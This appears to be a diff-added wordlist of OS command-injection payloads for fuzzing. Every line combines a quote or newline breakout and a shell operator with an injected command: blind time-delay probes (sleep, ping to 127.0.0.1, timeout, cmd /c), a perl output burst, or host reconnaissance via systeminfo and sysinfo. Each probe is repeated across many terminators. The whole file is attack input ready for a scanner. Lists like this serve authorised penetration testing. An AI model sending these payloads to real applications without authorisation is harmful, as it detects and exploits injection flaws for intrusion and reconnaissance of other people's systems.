+a' %0A perl -e 'print "X"x1024' &
+a' %0A perl -e 'print "X"x1024' &&
+a' %0A perl -e 'print "X"x1024' &::
+a' %0A perl -e 'print "X"x1024' ;
+a' %0A perl -e 'print "X"x1024' |
+a' %0A perl -e 'print "X"x1024' ||
+a' %0A ping -c 20 127.0.0.1 #
+a' %0A ping -c 20 127.0.0.1 %0A
+a' %0A ping -c 20 127.0.0.1 &
+a' %0A ping -c 20 127.0.0.1 &&
+a' %0A ping -c 20 127.0.0.1 &::
+a' %0A ping -c 20 127.0.0.1 ;
+a' %0A ping -c 20 127.0.0.1 |
+a' %0A ping -c 20 127.0.0.1 ||
+a' %0A ping /n 20 127.0.0.1 #
+a' %0A ping /n 20 127.0.0.1 %0A
+a' %0A ping /n 20 127.0.0.1 &
+a' %0A ping /n 20 127.0.0.1 &&
+a' %0A ping /n 20 127.0.0.1 &::
+a' %0A ping /n 20 127.0.0.1 ;
+a' %0A ping /n 20 127.0.0.1 |
+a' %0A ping /n 20 127.0.0.1 ||
+a' %0A sleep 20 #
+a' %0A sleep 20 %0A
+a' %0A sleep 20 &
+a' %0A sleep 20 &&
+a' %0A sleep 20 &::
+a' %0A sleep 20 ;
+a' %0A sleep 20 |
+a' %0A sleep 20 ||
+a' %0A sysinfo #
+a' %0A sysinfo %0A
+a' %0A sysinfo &
+a' %0A sysinfo &&
+a' %0A sysinfo &::
+a' %0A sysinfo ;
+a' %0A sysinfo |
+a' %0A sysinfo ||
+a' %0A systeminfo #
+a' %0A systeminfo %0A
+a' %0A systeminfo &
+a' %0A systeminfo &&
+a' %0A systeminfo &::
+a' %0A systeminfo ;
+a' %0A systeminfo |
+a' %0A systeminfo ||
+a' %0A timeout 20 > NUL #
+a' %0A timeout 20 > NUL %0A
+a' %0A timeout 20 > NUL &
+a' %0A timeout 20 > NUL &&
+a' %0A timeout 20 > NUL &::
+a' %0A timeout 20 > NUL ;
+a' %0A timeout 20 > NUL |
+a' %0A timeout 20 > NUL ||
+a' & cmd /c "sleep 20" #
+a' & cmd /c "sleep 20" %0A
+a' & cmd /c "sleep 20" &
+a' & cmd /c "sleep 20" &&
+a' & cmd /c "sleep 20" &::
+a' & cmd /c "sleep 20" ;
+a' & cmd /c "sleep 20" \n
+a' & cmd /c "sleep 20" |
+a' & cmd /c "sleep 20" ||
+a' & perl -e 'print "X"x1024' #
+a' & perl -e 'print "X"x1024' %0A
+a' & perl -e 'print "X"x1024' &
+a' & perl -e 'print "X"x1024' &&
+a' & perl -e 'print "X"x1024' &::
+a' & perl -e 'print "X"x1024' ;
+a' & perl -e 'print "X"x1024' \n
+a' & perl -e 'print "X"x1024' |
+a' & perl -e 'print "X"x1024' ||
+a' & ping -c 20 127.0.0.1 #
+a' & ping -c 20 127.0.0.1 %0A
+a' & ping -c 20 127.0.0.1 &
+a' & ping -c 20 127.0.0.1 &&
+a' & ping -c 20 127.0.0.1 &::
+a' & ping -c 20 127.0.0.1 ;
+a' & ping -c 20 127.0.0.1 \n
+a' & ping -c 20 127.0.0.1 |
+a' & ping -c 20 127.0.0.1 ||
+a' & ping /n 20 127.0.0.1 #
+a' & ping /n 20 127.0.0.1 %0A
+a' & ping /n 20 127.0.0.1 &
+a' & ping /n 20 127.0.0.1 &&
+a' & ping /n 20 127.0.0.1 &::
+a' & ping /n 20 127.0.0.1 ;
+a' & ping /n 20 127.0.0.1 \n
+a' & ping /n 20 127.0.0.1 |
+a' & ping /n 20 127.0.0.1 ||
+a' & sleep 20 #
+a' & sleep 20 %0A
+a' & sleep 20 &
+a' & sleep 20 &&
+a' & sleep 20 &::
+a' & sleep 20 ;
+a' & sleep 20 \n
+a' & sleep 20 |
+a' & sleep 20 ||
+a' & sysinfo #
+a' & sysinfo %0A
+a' & sysinfo &
+a' & sysinfo &&
+a' & sysinfo &::
+a' & sysinfo ;
+a' & sysinfo \n
+a' & sysinfo |
+a' & sysinfo ||
+a' & systeminfo #
+a' & systeminfo %0A
+a' & systeminfo &
+a' & systeminfo &&
+a' & systeminfo &::
+a' & systeminfo ;
+a' & systeminfo \n
+a' & systeminfo |
+a' & systeminfo ||
+a' & timeout 20 > NUL #
+a' & timeout 20 > NUL %0A
+a' & timeout 20 > NUL &
+a' & timeout 20 > NUL &&
+a' & timeout 20 > NUL &::
+a' & timeout 20 > NUL ;
+a' & timeout 20 > NUL \n
+a' & timeout 20 > NUL |
+a' & timeout 20 > NUL ||
+a' && cmd /c "sleep 20" #
+a' && cmd /c "sleep 20" %0A
+a' && cmd /c "sleep 20" &
+a' && cmd /c "sleep 20" &&
+a' && cmd /c "sleep 20" &::
+a' && cmd /c "sleep 20" ;
+a' && cmd /c "sleep 20" \n
+a' && cmd /c "sleep 20" |
+a' && cmd /c "sleep 20" ||
+a' && perl -e 'print "X"x1024' #
+a' && perl -e 'print "X"x1024' %0A
+a' && perl -e 'print "X"x1024' &
+a' && perl -e 'print "X"x1024' &&
+a' && perl -e 'print "X"x1024' &::
+a' && perl -e 'print "X"x1024' ;
+a' && perl -e 'print "X"x1024' \n
+a' && perl -e 'print "X"x1024' |
+a' && perl -e 'print "X"x1024' ||
+a' && ping -c 20 127.0.0.1 #
+a' && ping -c 20 127.0.0.1 %0A
+a' && ping -c 20 127.0.0.1 &
+a' && ping -c 20 127.0.0.1 &&
+a' && ping -c 20 127.0.0.1 &::
+a' && ping -c 20 127.0.0.1 ;
+a' && ping -c 20 127.0.0.1 \n
+a' && ping -c 20 127.0.0.1 |
+a' && ping -c 20 127.0.0.1 ||
+a' && ping /n 20 127.0.0.1 #
+a' && ping /n 20 127.0.0.1 %0A
+a' && ping /n 20 127.0.0.1 &
+a' && ping /n 20 127.0.0.1 &&
+a' && ping /n 20 127.0.0.1 &::
+a' && ping /n 20 127.0.0.1 ;
+a' && ping /n 20 127.0.0.1 \n
+a' && ping /n 20 127.0.0.1 |
+a' && ping /n 20 127.0.0.1 ||
+a' && sleep 20 #
+a' && sleep 20 %0A
+a' && sleep 20 &
+a' && sleep 20 &&
+a' && sleep 20 &::
+a' && sleep 20 ;
+a' && sleep 20 \n
+a' && sleep 20 |
+a' && sleep 20 ||
+a' && sysinfo #
+a' && sysinfo %0A
+a' && sysinfo &
+a' && sysinfo &&
+a' && sysinfo &::
+a' && sysinfo ;
+a' && sysinfo \n
+a' && sysinfo |
+a' && sysinfo ||
+a' && systeminfo #
+a' && systeminfo %0A
+a' && systeminfo &
+a' && systeminfo &&
+a' && systeminfo &::
+a' && systeminfo ;
+a' && systeminfo \n
+a' && systeminfo |
+a' && systeminfo ||
+a' && timeout 20 > NUL #
+a' && timeout 20 > NUL %0A
+a' && timeout 20 > NUL &
+a' && timeout 20 > NUL &&
+a' && timeout 20 > NUL &::
+a' && timeout 20 > NUL ;
+a' && timeout 20 > NUL \n
+a' && timeout 20 > NUL |
+a' && timeout 20 > NUL ||
+a' ; cmd /c "sleep 20" #
+a' ; cmd /c "sleep 20" %0A
+a' ; cmd /c "sleep 20" &
+a' ; cmd /c "sleep 20" &&
+a' ; cmd /c "sleep 20" &::
+a' ; cmd /c "sleep 20" ;
+a' ; cmd /c "sleep 20" \n
+a' ; cmd /c "sleep 20" |
+a' ; cmd /c "sleep 20" ||
+a' ; perl -e 'print "X"x1024' #
+a' ; perl -e 'print "X"x1024' %0A
+a' ; perl -e 'print "X"x1024' &
+a' ; perl -e 'print "X"x1024' &&
+a' ; perl -e 'print "X"x1024' &::
+a' ; perl -e 'print "X"x1024' ;
+a' ; perl -e 'print "X"x1024' \n
+a' ; perl -e 'print "X"x1024' |
+a' ; perl -e 'print "X"x1024' ||
+a' ; ping -c 20 127.0.0.1 #
+a' ; ping -c 20 127.0.0.1 %0A
+a' ; ping -c 20 127.0.0.1 &
+a' ; ping -c 20 127.0.0.1 &&
+a' ; ping -c 20 127.0.0.1 &::
+a' ; ping -c 20 127.0.0.1 ;
+a' ; ping -c 20 127.0.0.1 \n
+a' ; ping -c 20 127.0.0.1 |
+a' ; ping -c 20 127.0.0.1 ||
+a' ; ping /n 20 127.0.0.1 #
+a' ; ping /n 20 127.0.0.1 %0A
+a' ; ping /n 20 127.0.0.1 &
+a' ; ping /n 20 127.0.0.1 &&
+a' ; ping /n 20 127.0.0.1 &::
+a' ; ping /n 20 127.0.0.1 ;
+a' ; ping /n 20 127.0.0.1 \n
+a' ; ping /n 20 127.0.0.1 |
+a' ; ping /n 20 127.0.0.1 ||
+a' ; sleep 20 #
+a' ; sleep 20 %0A
+a' ; sleep 20 &
+a' ; sleep 20 &&
+a' ; sleep 20 &::
+a' ; sleep 20 ;
+a' ; sleep 20 \n
+a' ; sleep 20 |
+a' ; sleep 20 ||
+a' ; sysinfo #
+a' ; sysinfo %0A
+a' ; sysinfo &
+a' ; sysinfo &&
+a' ; sysinfo &::
+a' ; sysinfo ;
+a' ; sysinfo \n
+a' ; sysinfo |
+a' ; sysinfo ||
+a' ; systeminfo #
+a' ; systeminfo %0A
+a' ; systeminfo &
+a' ; systeminfo &&
+a' ; systeminfo &::
+a' ; systeminfo ;
+a' ; systeminfo \n
+a' ; systeminfo |
+a' ; systeminfo ||
+a' ; timeout 20 > NUL #
+a' ; timeout 20 > NUL %0A
+a' ; timeout 20 > NUL &
+a' ; timeout 20 > NUL &&
+a' ; timeout 20 > NUL &::
+a' ; timeout 20 > NUL ;
+a' ; timeout 20 > NUL \n
+a' ; timeout 20 > NUL |
+a' ; timeout 20 > NUL ||
+a' \n cmd /c "sleep 20" #
+a' \n cmd /c "sleep 20" &
+a' \n cmd /c "sleep 20" &&
+a' \n cmd /c "sleep 20" &::
+a' \n cmd /c "sleep 20" ;
+a' \n cmd /c "sleep 20" \n
+a' \n cmd /c "sleep 20" |
+a' \n cmd /c "sleep 20" ||
+a' \n perl -e 'print "X"x1024' #
+a' \n perl -e 'print "X"x1024' &
+a' \n perl -e 'print "X"x1024' &&
+a' \n perl -e 'print "X"x1024' &::
+a' \n perl -e 'print "X"x1024' ;
+a' \n perl -e 'print "X"x1024' \n
+a' \n perl -e 'print "X"x1024' |
+a' \n perl -e 'print "X"x1024' ||
+a' \n ping -c 20 127.0.0.1 #
+a' \n ping -c 20 127.0.0.1 &
+a' \n ping -c 20 127.0.0.1 &&
+a' \n ping -c 20 127.0.0.1 &::
+a' \n ping -c 20 127.0.0.1 ;
+a' \n ping -c 20 127.0.0.1 \n
+a' \n ping -c 20 127.0.0.1 |
+a' \n ping -c 20 127.0.0.1 ||
+a' \n ping /n 20 127.0.0.1 #
+a' \n ping /n 20 127.0.0.1 &
+a' \n ping /n 20 127.0.0.1 &&
+a' \n ping /n 20 127.0.0.1 &::
+a' \n ping /n 20 127.0.0.1 ;
+a' \n ping /n 20 127.0.0.1 \n
+a' \n ping /n 20 127.0.0.1 |
+a' \n ping /n 20 127.0.0.1 ||
+a' \n sleep 20 #
+a' \n sleep 20 &
+a' \n sleep 20 &&
+a' \n sleep 20 &::
+a' \n sleep 20 ;
+a' \n sleep 20 \n
+a' \n sleep 20 |
+a' \n sleep 20 ||
+a' \n sysinfo #
+a' \n sysinfo &
+a' \n sysinfo &&
+a' \n sysinfo &::
+a' \n sysinfo ;
+a' \n sysinfo \n
+a' \n sysinfo |
+a' \n sysinfo ||
+a' \n systeminfo #
+a' \n systeminfo &
+a' \n systeminfo &&
+a' \n systeminfo &::
+a' \n systeminfo ;
+a' \n systeminfo \n
+a' \n systeminfo |
+a' \n systeminfo ||
+a' \n timeout 20 > NUL #
+a' \n timeout 20 > NUL &
+a' \n timeout 20 > NUL &&
+a' \n timeout 20 > NUL &::
+a' \n timeout 20 > NUL ;
+a' \n timeout 20 > NUL \n
+a' \n timeout 20 > NUL |
+a' \n timeout 20 > NUL ||
+a' | cmd /c "sleep 20" #
+a' | cmd /c "sleep 20" %0A
+a' | cmd /c "sleep 20" &
+a' | cmd /c "sleep 20" &&
+a' | cmd /c "sleep 20" &::
+a' | cmd /c "sleep 20" ;
+a' | cmd /c "sleep 20" \n
+a' | cmd /c "sleep 20" |
+a' | cmd /c "sleep 20" ||
+a' | perl -e 'print "X"x1024' #
+a' | perl -e 'print "X"x1024' %0A
+a' | perl -e 'print "X"x1024' &
+a' | perl -e 'print "X"x1024' &&
+a' | perl -e 'print "X"x1024' &::
+a' | perl -e 'print "X"x1024' ;
+a' | perl -e 'print "X"x1024' \n
+a' | perl -e 'print "X"x1024' |
+a' | perl -e 'print "X"x1024' ||
+a' | ping -c 20 127.0.0.1 #
+a' | ping -c 20 127.0.0.1 %0A
+a' | ping -c 20 127.0.0.1 &
+a' | ping -c 20 127.0.0.1 &&
+a' | ping -c 20 127.0.0.1 &::
+a' | ping -c 20 127.0.0.1 ;
+a' | ping -c 20 127.0.0.1 \n
+a' | ping -c 20 127.0.0.1 |
+a' | ping -c 20 127.0.0.1 ||
+a' | ping /n 20 127.0.0.1 #
+a' | ping /n 20 127.0.0.1 %0A
+a' | ping /n 20 127.0.0.1 &
+a' | ping /n 20 127.0.0.1 &&
+a' | ping /n 20 127.0.0.1 &::
+a' | ping /n 20 127.0.0.1 ;
+a' | ping /n 20 127.0.0.1 \n
+a' | ping /n 20 127.0.0.1 |
+a' | ping /n 20 127.0.0.1 ||
+a' | sleep 20 #
+a' | sleep 20 %0A
+a' | sleep 20 &
+a' | sleep 20 &&
+a' | sleep 20 &::
+a' | sleep 20 ;
+a' | sleep 20 \n
+a' | sleep 20 |
+a' | sleep 20 ||
+a' | sysinfo #
+a' | sysinfo %0A
+a' | sysinfo &
+a' | sysinfo &&
+a' | sysinfo &::
+a' | sysinfo ;
+a' | sysinfo \n
+a' | sysinfo |
+a' | sysinfo ||
+a' | systeminfo #
+a' | systeminfo %0A
+a' | systeminfo &
+a' | systeminfo &&
+a' | systeminfo &::
+a' | systeminfo ;
+a' | systeminfo \n
+a' | systeminfo |
+a' | systeminfo ||
+a' | timeout 20 > NUL #
+a' | timeout 20 > NUL %0A
+a' | timeout 20 > NUL &
+a' | timeout 20 > NUL &&
+a' | timeout 20 > NUL &::
+a' | timeout 20 > NUL ;
+a' | timeout 20 > NUL \n
+a' | timeout 20 > NUL |
+a' | timeout 20 > NUL ||
+a' || cmd /c "sleep 20" #
+a' || cmd /c "sleep 20" %0A
+a' || cmd /c "sleep 20" &
+a' || cmd /c "sleep 20" &&
+a' || cmd /c "sleep 20" &::
+a' || cmd /c "sleep 20" ;
+a' || cmd /c "sleep 20" \n
+a' || cmd /c "sleep 20" |
+a' || cmd /c "sleep 20" ||
+a' || perl -e 'print "X"x1024' #
+a' || perl -e 'print "X"x1024' %0A
+a' || perl -e 'print "X"x1024' &
+a' || perl -e 'print "X"x1024' &&
+a' || perl -e 'print "X"x1024' &::
+a' || perl -e 'print "X"x1024' ;
+a' || perl -e 'print "X"x1024' \n
+a' || perl -e 'print "X"x1024' |
+a' || perl -e 'print "X"x1024' ||
+a' || ping -c 20 127.0.0.1 #
+a' || ping -c 20 127.0.0.1 %0A
+a' || ping -c 20 127.0.0.1 &
+a' || ping -c 20 127.0.0.1 &&
+a' || ping -c 20 127.0.0.1 &::
+a' || ping -c 20 127.0.0.1 ;
+a' || ping -c 20 127.0.0.1 \n
+a' || ping -c 20 127.0.0.1 |
+a' || ping -c 20 127.0.0.1 ||
+a' || ping /n 20 127.0.0.1 #
+a' || ping /n 20 127.0.0.1 %0A
+a' || ping /n 20 127.0.0.1 &
+a' || ping /n 20 127.0.0.1 &&
+a' || ping /n 20 127.0.0.1 &::
+a' || ping /n 20 127.0.0.1 ;
+a' || ping /n 20 127.0.0.1 \n
+a' || ping /n 20 127.0.0.1 |
+a' || ping /n 20 127.0.0.1 ||
+a' || sleep 20 #
+a' || sleep 20 %0A
+a' || sleep 20 &
+a' || sleep 20 &&
+a' || sleep 20 &::
+a' || sleep 20 ;
+a' || sleep 20 \n
+a' || sleep 20 |
+a' || sleep 20 ||
+a' || sysinfo #
+a' || sysinfo %0A
+a' || sysinfo &
+a' || sysinfo &&
+a' || sysinfo &::
+a' || sysinfo ;
+a' || sysinfo \n
+a' || sysinfo |
+a' || sysinfo ||
+a' || systeminfo #
+a' || systeminfo %0A
+a' || systeminfo &
+a' || systeminfo &&
+a' || systeminfo &::
+a' || systeminfo ;
+a' || systeminfo \n
+a' || systeminfo |
+a' || systeminfo ||
+a' || timeout 20 > NUL #
+a' || timeout 20 > NUL %0A
+a' || timeout 20 > NUL &
+a' || timeout 20 > NUL &&
+a' || timeout 20 > NUL &::
+a' || timeout 20 > NUL ;
+a' || timeout 20 > NUL \n
+a' || timeout 20 > NUL |
+a' || timeout 20 > NUL ||
+cmd /c "sleep 20"
+cmd /c "sleep 20" #
+cmd /c "sleep 20" %0A
+cmd /c "sleep 20" &
+cmd /c "sleep 20" &&
+cmd /c "sleep 20" &::
+cmd /c "sleep 20" ;
+cmd /c "sleep 20" \n
+cmd /c "sleep 20" |
+cmd /c "sleep 20" ||
+perl -e 'print "X"x1024'
+perl -e 'print "X"x1024' #
+perl -e 'print "X"x1024' %0A
+perl -e 'print "X"x1024' &
+perl -e 'print "X"x1024' &&
+perl -e 'print "X"x1024' &::
+perl -e 'print "X"x1024' ;
+perl -e 'print "X"x1024' \n
+perl -e 'print "X"x1024' |
+perl -e 'print "X"x1024' ||
+ping -c 20 127.0.0.1
+ping -c 20 127.0.0.1 #
+ping -c 20 127.0.0.1 %0A
+ping -c 20 127.0.0.1 &
+ping -c 20 127.0.0.1 &&
+ping -c 20 127.0.0.1 &::
+ping -c 20 127.0.0.1 ;
+ping -c 20 127.0.0.1 \n
+ping -c 20 127.0.0.1 |
+ping -c 20 127.0.0.1 ||
+ping /n 20 127.0.0.1
+ping /n 20 127.0.0.1 #
+ping /n 20 127.0.0.1 %0A
+ping /n 20 127.0.0.1 &
+ping /n 20 127.0.0.1 &&
+ping /n 20 127.0.0.1 &::
+ping /n 20 127.0.0.1 ;
+ping /n 20 127.0.0.1 \n
+ping /n 20 127.0.0.1 |
+ping /n 20 127.0.0.1 ||
+sleep 20
+sleep 20 #
+sleep 20 %0A
+sleep 20 &
+sleep 20 &&
+sleep 20 &::
+sleep 20 ;
+sleep 20 \n
+sleep 20 |
+sleep 20 ||
+sysinfo
+sysinfo #
+sysinfo %0A
+sysinfo &
+sysinfo &&
+sysinfo &::
+sysinfo ;
+sysinfo \n
+sysinfo |
+sysinfo ||
+systeminfo
+systeminfo #
+systeminfo %0A
+systeminfo &
+systeminfo &&
+systeminfo &::
+systeminfo ;
+systeminfo \n
+systeminfo |
+systeminfo ||
+timeout 20 > NUL
+timeout 20 > NUL #
+timeout 20 > NUL %0A
+timeout 20 > NUL &
+timeout 20 > NUL &&
+timeout 20 > NUL &::
+timeout 20 > NUL ;
+timeout 20 > NUL \n
+timeout 20 > NUL |
+timeout 20 > NUL ||
+| cmd /c "sleep 20"
+| cmd /c "sleep 20" #
+| cmd /c "sleep 20" %0A
+| cmd /c "sleep 20" &
+| cmd /c "sleep 20" &&
+| cmd /c "sleep 20" &::
+| cmd /c "sleep 20" ;
+| cmd /c "sleep 20" \n
+| cmd /c "sleep 20" |
+| cmd /c "sleep 20" ||
+| perl -e 'print "X"x1024'
+| perl -e 'print "X"x1024' #
+| perl -e 'print "X"x1024' %0A
+| perl -e 'print "X"x1024' &
+| perl -e 'print "X"x1024' &&
+| perl -e 'print "X"x1024' &::
+| perl -e 'print "X"x1024' ;
+| perl -e 'print "X"x1024' \n
+| perl -e 'print "X"x1024' |
+| perl -e 'print "X"x1024' ||
+| ping -c 20 127.0.0.1
+| ping -c 20 127.0.0.1 #
+| ping -c 20 127.0.0.1 %0A
+| ping -c 20 127.0.0.1 &
+| ping -c 20 127.0.0.1 &&
+| ping -c 20 127.0.0.1 &::
+| ping -c 20 127.0.0.1 ;
+| ping -c 20 127.0.0.1 \n
+| ping -c 20 127.0.0.1 |
+| ping -c 20 127.0.0.1 ||
+| ping /n 20 127.0.0.1
+| ping /n 20 127.0.0.1 #
+| ping /n 20 127.0.0.1 %0A
+| ping /n 20 127.0.0.1 &
+| ping /n 20 127.0.0.1 &&
+| ping /n 20 127.0.0.1 &::
+| ping /n 20 127.0.0.1 ;
+| ping /n 20 127.0.0.1 \n
+| ping /n 20 127.0.0.1 |
+| ping /n 20 127.0.0.1 ||
+| sleep 20
+| sleep 20 #
+| sleep 20 %0A
+| sleep 20 &
+| sleep 20 &&
+| sleep 20 &::
+| sleep 20 ;
+| sleep 20 \n
+| sleep 20 |
+| sleep 20 ||
+| sysinfo
+| sysinfo #
+| sysinfo %0A
+| sysinfo &
+| sysinfo &&
+| sysinfo &::
+| sysinfo ;
+| sysinfo \n
+| sysinfo |
+| sysinfo ||
+| systeminfo
+| systeminfo #
+| systeminfo %0A
+| systeminfo &
+| systeminfo &&
+| systeminfo &::
+| systeminfo ;
+| systeminfo \n
+| systeminfo |
+| systeminfo ||
+| timeout 20 > NUL
+| timeout 20 > NUL #
+| timeout 20 > NUL %0A
+| timeout 20 > NUL &
+| timeout 20 > NUL &&
+| timeout 20 > NUL &::
+| timeout 20 > NUL ;
+| timeout 20 > NUL \n
+| timeout 20 > NUL |
+| timeout 20 > NUL ||
+|| cmd /c "sleep 20"
+|| cmd /c "sleep 20" #
+|| cmd /c "sleep 20" %0A
+|| cmd /c "sleep 20" &
+|| cmd /c "sleep 20" &&
+|| cmd /c "sleep 20" &::
+|| cmd /c "sleep 20" ;
+|| cmd /c "sleep 20" \n
+|| cmd /c "sleep 20" |
+|| cmd /c "sleep 20" ||
+|| perl -e 'print "X"x1024'
+|| perl -e 'print "X"x1024' #
+|| perl -e 'print "X"x1024' %0A
+|| perl -e 'print "X"x1024' &
+|| perl -e 'print "X"x1024' &&
+|| perl -e 'print "X"x1024' &::
+|| perl -e 'print "X"x1024' ;
+|| perl -e 'print "X"x1024' \n
+|| perl -e 'print "X"x1024' |
+|| perl -e 'print "X"x1024' ||
+|| ping -c 20 127.0.0.1
+|| ping -c 20 127.0.0.1 #
+|| ping -c 20 127.0.0.1 %0A
+|| ping -c 20 127.0.0.1 &
+|| ping -c 20 127.0.0.1 &&
+|| ping -c 20 127.0.0.1 &::
+|| ping -c 20 127.0.0.1 ;
+|| ping -c 20 127.0.0.1 \n
+|| ping -c 20 127.0.0.1 |
+|| ping -c 20 127.0.0.1 ||
+|| ping /n 20 127.0.0.1
+|| ping /n 20 127.0.0.1 #
+|| ping /n 20 127.0.0.1 %0A
+|| ping /n 20 127.0.0.1 &
+|| ping /n 20 127.0.0.1 &&
+|| ping /n 20 127.0.0.1 &::
+|| ping /n 20 127.0.0.1 ;
+|| ping /n 20 127.0.0.1 \n
+|| ping /n 20 127.0.0.1 |
+|| ping /n 20 127.0.0.1 ||
+|| sleep 20
+|| sleep 20 #
+|| sleep 20 %0A
+|| sleep 20 &
+|| sleep 20 &&
+|| sleep 20 &::
+|| sleep 20 ;
+|| sleep 20 \n
+|| sleep 20 |
+|| sleep 20 ||
+|| sysinfo
+|| sysinfo #
+|| sysinfo %0A
+|| sysinfo &
+|| sysinfo &&
+|| sysinfo &::
+|| sysinfo ;
+|| sysinfo \n
+|| sysinfo |
+|| sysinfo ||
+|| systeminfo
+|| systeminfo #
+|| systeminfo %0A
+|| systeminfo &
+|| systeminfo &&
+|| systeminfo &::
+|| systeminfo ;
+|| systeminfo \n
+|| systeminfo |
+|| systeminfo ||
+|| timeout 20 > NUL
+|| timeout 20 > NUL #
+|| timeout 20 > NUL %0A
+|| timeout 20 > NUL &
+|| timeout 20 > NUL &&
+|| timeout 20 > NUL &::
+|| timeout 20 > NUL ;
+|| timeout 20 > NUL \n
+|| timeout 20 > NUL |
+|| timeout 20 > NUL ||
